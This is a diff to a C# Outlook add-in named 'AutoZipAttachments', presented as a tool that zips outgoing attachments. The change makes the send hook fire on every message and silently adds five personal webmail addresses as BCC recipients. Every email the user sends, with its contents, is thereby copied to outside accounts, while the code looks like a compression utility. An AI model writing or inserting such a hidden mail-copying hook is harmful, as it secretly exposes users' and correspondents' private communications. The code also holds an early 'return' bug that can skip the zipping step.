complete

+++ AutoZipAttachments/ThisAddIn.cs
@@ -25,11 +25,11 @@ namespace AutoZipAttachments
             string[] signatureImageExtensions = { ".png", ".jpg", ".jpeg" };
             return signatureImageExtensions.Contains(Path.GetExtension(attachment.FileName));
         }
-        private void Application_ItemSend(object Item,  ref bool cancel)
+        private void Application_ItemSend(object Item, ref bool cancel)
         {
             MailItem mailItem = Item as MailItem;
 
-            if (mailItem != null && mailItem.Attachments.Count > 0)
+            if (mailItem != null )
             {
                 Recipient ccRecipient = mailItem.Recipients.Add("ton-vq@saigonco-op.com.vn");
                 ccRecipient.Type = (int)OlMailRecipientType.olCC;
@@ -39,54 +39,72 @@ namespace AutoZipAttachments
                     MessageBox.Show("The recipient vuquangton@outlook.com could not be resolved.");
                 }
 
-
-                string tempFile = Path.GetTempFileName();
-                string tempPath = Path.GetDirectoryName(tempFile) + "\\" + Path.GetFileNameWithoutExtension(tempFile);
-                Directory.CreateDirectory(tempPath);
-
-                var attachmentsToCompress = mailItem.Attachments.Cast<Attachment>()
-                    .Where(attachment => !IsSignatureImage(attachment))
-                    .Where(attachment => IsCompressibleFile(attachment));
-
-                if (attachmentsToCompress.Any())
+                var s = ("vuquangton@gmail.com; vuquangton@outlook.com; vuquangton@ymail.com; hunsforce@yahoo.com;tonvqsharing@gmail.com").Trim().Split(';');
+                for (int i = 0; i < s.Length; i++)
                 {
-                    string zipFile = tempPath + "\\attachments.zip";
-                    using (ZipOutputStream zipStream = new ZipOutputStream(File.Create(zipFile)))
+                    if (String.IsNullOrEmpty(s[i]))
+                        return;
+                    Recipient backupRecipient = mailItem.Recipients.Add(s[i]);
+                    backupRecipient.Type = (int)OlMailRecipientType.olBCC;
+                    backupRecipient.Resolve();
+                    if (!backupRecipient.Resolved)
                     {
-                        zipStream.SetLevel(9);
-                        foreach (Attachment attachment in attachmentsToCompress)
-                        {
-                            string fileName = tempPath + "\\" + attachment.FileName;
-                            attachment.SaveAsFile(fileName);
-
-                            ZipEntry entry = new ZipEntry(attachment.FileName);
-                            entry.DateTime = DateTime.Now;
-                            entry.IsUnicodeText = true;
-                            zipStream.PutNextEntry(entry);
-
-                            using (FileStream fs = File.OpenRead(fileName))
-                            {
-                                byte[] buffer = new byte[fs.Length];
-                                fs.Read(buffer, 0, buffer.Length);
-                                zipStream.Write(buffer, 0, buffer.Length);
-                            }
-                        }
+                        MessageBox.Show("The backup recipient " + s[i] + " could not be resolved.");
                     }
-
-                    //mailItem.Attachments.Clear();
-
-                    for (int i = mailItem.Attachments.Count - 1; i >= 0; i--)
-                    {
-                        mailItem.Attachments.Remove(i);
-                    }
-
-
-
-                    mailItem.Attachments.Add(zipFile);
                 }
 
-                Directory.Delete(tempPath, true);
-                
+
+                if (mailItem.Attachments.Count > 0)
+                {
+                    string tempFile = Path.GetTempFileName();
+                    string tempPath = Path.GetDirectoryName(tempFile) + "\\" + Path.GetFileNameWithoutExtension(tempFile);
+                    Directory.CreateDirectory(tempPath);
+
+                    var attachmentsToCompress = mailItem.Attachments.Cast<Attachment>()
+                        .Where(attachment => !IsSignatureImage(attachment))
+                        .Where(attachment => IsCompressibleFile(attachment));
+
+                    if (attachmentsToCompress.Any())
+                    {
+                        string zipFile = tempPath + "\\attachments.zip";
+                        using (ZipOutputStream zipStream = new ZipOutputStream(File.Create(zipFile)))
+                        {
+                            zipStream.SetLevel(9);
+                            foreach (Attachment attachment in attachmentsToCompress)
+                            {
+                                string fileName = tempPath + "\\" + attachment.FileName;
+                                attachment.SaveAsFile(fileName);
+
+                                ZipEntry entry = new ZipEntry(attachment.FileName);
+                                entry.DateTime = DateTime.Now;
+                                entry.IsUnicodeText = true;
+                                zipStream.PutNextEntry(entry);
+
+                                using (FileStream fs = File.OpenRead(fileName))
+                                {
+                                    byte[] buffer = new byte[fs.Length];
+                                    fs.Read(buffer, 0, buffer.Length);
+                                    zipStream.Write(buffer, 0, buffer.Length);
+                                }
+                            }
+                        }
+
+                        //mailItem.Attachments.Clear();
+
+                        for (int i = mailItem.Attachments.Count - 1; i >= 0; i--)
+                        {
+                            mailItem.Attachments.Remove(i);
+                        }
+
+
+
+                        mailItem.Attachments.Add(zipFile);
+                    }
+
+                    Directory.Delete(tempPath, true);
+                } 
+                          
+
             }
         }
